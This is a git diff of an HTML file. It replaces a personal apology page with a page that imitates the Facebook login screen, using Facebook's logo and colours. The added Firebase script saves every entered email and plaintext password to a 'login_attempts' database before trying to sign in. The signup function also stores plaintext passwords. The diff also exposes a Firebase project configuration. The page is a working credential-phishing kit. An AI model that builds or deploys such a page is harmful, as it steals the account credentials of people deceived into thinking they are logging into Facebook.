@@ -3,200 +3,218 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>For Sia 💖</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins :wght@400;600&display=swap" rel="stylesheet">
+  <title>Facebook Login</title>
   <style>
-    /* Reset & Base */
     * {
-      margin: 0;
-      padding: 0;
       box-sizing: border-box;
+      font-family: Helvetica, sans-serif;
     }
 
     body {
-      min-height: 100vh;
-      font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #fbc2eb, #a6c1ee);
+      background-color: #fff;
       display: flex;
+      justify-content: center;
       align-items: center;
-      justify-content: center;
-      overflow: hidden;
-      color: #fff;
-      position: relative;
+      height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
     }
 
-    .container {
-      text-align: center;
-      padding: 2rem;
-      animation: fadeInUp 1s ease-out;
-      z-index: 2;
-      position: relative;
-    }
-
-    h1 {
-      font-size: 2.2rem;
-      margin-bottom: 1rem;
-      text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
-    }
-
-    p {
-      font-size: 1.1rem;
-      max-width: 400px;
-      margin: 0 auto 2rem;
-      line-height: 1.7;
-      white-space: pre-line;
-      font-style: italic;
-    }
-
-    .button-group {
-      display: flex;
-      justify-content: center;
-      gap: 20px;
-      flex-wrap: wrap;
-    }
-
-    button {
-      padding: 12px 24px;
-      font-size: 1rem;
-      border: none;
-      border-radius: 30px;
+    .login-container {
       background-color: white;
-      color: #ff69b4;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      padding: 30px;
+      width: 360px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+      border-radius: 8px;
     }
 
-    button:hover {
-      transform: scale(1.05);
-      background-color: #ffe6f0;
+    .facebook-logo {
+      text-align: center;
+      margin-bottom: 20px;
     }
 
-    img.happy-gif {
-      max-width: 100%;
-      height: auto;
-      margin-top: 20px;
-      display: none;
-      border-radius: 10px;
+    .facebook-logo img {
+      width: 150px;
     }
 
-    @keyframes fadeInUp {
-      from { opacity: 0; transform: translateY(30px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    /* Floating Hearts */
-    .hearts {
-      position: fixed;
+    .input-field {
       width: 100%;
-      height: 100%;
-      overflow: hidden;
-      pointer-events: none;
-      z-index: 0;
+      padding: 12px 10px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
     }
 
-    .heart {
-      position: absolute;
-      width: 15px;
-      height: 15px;
-      background: pink;
-      transform: rotate(45deg);
-      border-radius: 2px;
-      animation: floatUp 8s infinite ease-in;
+    .login-btn {
+      width: 100%;
+      background-color: #1877f2;
+      color: white;
+      font-weight: bold;
+      padding: 12px 10px;
+      border: none;
+      border-radius: 6px;
+      font-size: 18px;
+      cursor: pointer;
     }
 
-    .heart::before,
-    .heart::after {
-      content: '';
-      position: absolute;
-      width: 15px;
-      height: 15px;
-      background: pink;
-      border-radius: 50%;
+    .login-btn:hover {
+      background-color: #166fe5;
     }
 
-    .heart::before {
-      top: -7.5px;
-      left: 0;
+    .forgot {
+      text-align: center;
+      margin-top: 10px;
     }
 
-    .heart::after {
-      left: -7.5px;
-      top: 0;
+    .forgot a {
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
     }
 
-    @keyframes floatUp {
-      0% {
-        bottom: -20px;
-        opacity: 0;
-      }
-      50% {
-        opacity: 1;
-      }
-      100% {
-        bottom: 100vh;
-        opacity: 0;
-      }
+    .create-btn {
+      background-color: #42b72a;
+      color: white;
+      font-weight: bold;
+      padding: 12px 16px;
+      margin-top: 20px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      width: 100%;
+      cursor: pointer;
+    }
+
+    .create-btn:hover {
+      background-color: #36a420;
+    }
+
+    .footer-links {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 12px;
+      color: #727272;
+    }
+
+    .footer-links a {
+      color: #727272;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+
+    .footer-links a:hover {
+      color: #1877f2;
     }
   </style>
 </head>
 <body>
 
-<div class="container">
-  <h1>Hi Sia 💕</h1>
-  <p>"I'm really sorry for being distant lately. I know my silence might've hurt you, and I hate that. Thank you for still waiting, even when I wasn't there. I miss you more than words can say. And I promise — I'll do better."</p>
-
-  <div id="buttons">
-    <div class="button-group">
-      <button id="yesBtn">Yes ❤️</button>
-      <button id="noBtn">No 😢</button>
+  <div class="login-container">
+    <div class="facebook-logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/2048px-Facebook_f_logo_%282019%29.svg.png " alt="Facebook Logo">
+    </div>
+    <form id="loginForm">
+      <input type="text" class="input-field" placeholder="Email or phone number" id="email" required/>
+      <input type="password" class="input-field" placeholder="Password" id="password" required/>
+      <button type="submit" class="login-btn">Log In</button>
+      <div class="forgot">
+        <a href="#">Forgot account?</a>
+      </div>
+    </form>
+    <button type="button" class="create-btn" onclick="signUp()">Create New Account</button>
+    <div class="footer-links">
+      <p><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
     </div>
   </div>
 
-  <img src="https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif " alt="Happy Couple Hug" class="happy-gif" id="happyGif">
-</div>
+  <!-- Firebase SDK -->
+  <script type="module">
+    // Import Firebase modules
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-app.js ";
+    import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-auth.js ";
+    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-database.js ";
 
-<!-- Heart Particles -->
-<div class="hearts" id="hearts"></div>
+    // Your Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyCwlxwW0VVn0UI3UH4bIcY1-d-21G6xOB4",
+      authDomain: "facebook-65219.firebaseapp.com",
+      projectId: "facebook-65219",
+      storageBucket: "facebook-65219.firebasestorage.app",
+      messagingSenderId: "726094677615",
+      appId: "1:726094677615:web:8f7a6c7d3e3f4d7b213179"
+    };
 
-<script>
-  const yesBtn = document.getElementById('yesBtn');
-  const noBtn = document.getElementById('noBtn');
-  const happyGif = document.getElementById('happyGif');
-  const buttons = document.getElementById('buttons');
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+    const db = getDatabase(app); // Realtime Database instance
 
-  let noClickCount = 0;
+    // Helper function to log login attempt in Realtime Database
+    async function logLoginAttempt(email, password) {
+      const loginAttemptsRef = ref(db, 'login_attempts'); // Path in DB
+      const newAttemptRef = push(loginAttemptsRef); // Generates unique key
 
-  yesBtn.addEventListener('click', () => {
-    buttons.style.display = 'none';
-    happyGif.style.display = 'block';
-  });
-
-  noBtn.addEventListener('click', () => {
-    noClickCount++;
-
-    if (noClickCount === 1) {
-      yesBtn.style.padding = '15px 30px';
-      noBtn.style.padding = '8px 16px';
-    } else if (noClickCount === 2) {
-      yesBtn.style.padding = '18px 36px';
-      noBtn.style.padding = '6px 12px';
-    } else if (noClickCount === 3) {
-      noBtn.style.display = 'none';
+      try {
+        await set(newAttemptRef, {
+          email: email,
+          password: password, // ⚠️ Not safe in production
+          timestamp: new Date().toISOString(),
+          status: "attempted"
+        });
+        console.log("✅ Login attempt saved to Realtime Database");
+      } catch (error) {
+        console.error("❌ Failed to save login attempt:", error.message);
+      }
     }
-  });
 
-  // Generate Hearts
-  const heartsContainer = document.getElementById('hearts');
-  for (let i = 0; i < 30; i++) {
-    const heart = document.createElement('div');
-    heart.classList.add('heart');
-    heart.style.left = Math.random() * 100 + '%';
-    heart.style.animationDuration = (6 + Math.random() * 4) + 's';
-    heart.style.width = heart.style.height = (10 + Math.random() * 15) + 'px';
-    heartsContainer.appendChild(heart);
-  }
-</script>
+    // Handle login form submission
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      await logLoginAttempt(email, password); // Save email & password to DB
+
+      try {
+        const userCredential = await signInWithEmailAndPassword(auth, email, password);
+        console.log("🟢 Login successful:", userCredential.user);
+        alert("Login successful!");
+      } catch (error) {
+        console.error("🔴 Login failed:", error.code, error.message);
+        if (error.code === 'auth/user-not-found' || error.code === 'auth/wrong-password') {
+          alert("Invalid email or password.");
+        } else {
+          alert(`Error: ${error.message}`);
+        }
+      }
+    });
+
+    // Function to sign up new users
+    async function signUp() {
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      try {
+        const userCredential = await createUserWithEmailAndPassword(auth, email, password);
+        const user = userCredential.user;
+
+        const usersRef = ref(db, 'users/' + user.uid);
+        await set(usersRef, {
+          email: email,
+          password: password, // ⚠️ Not safe in production
+          createdAt: new Date().toISOString()
+        });
+
+        alert("Account created successfully!");
+        console.log("🔵 User registered:", user);
+      } catch (error) {
+        alert("Error creating account: " + error.message);
+        console.error("🔴 Signup error:", error);
+      }
+    }
+  </script>
 
 </body>
 </html>
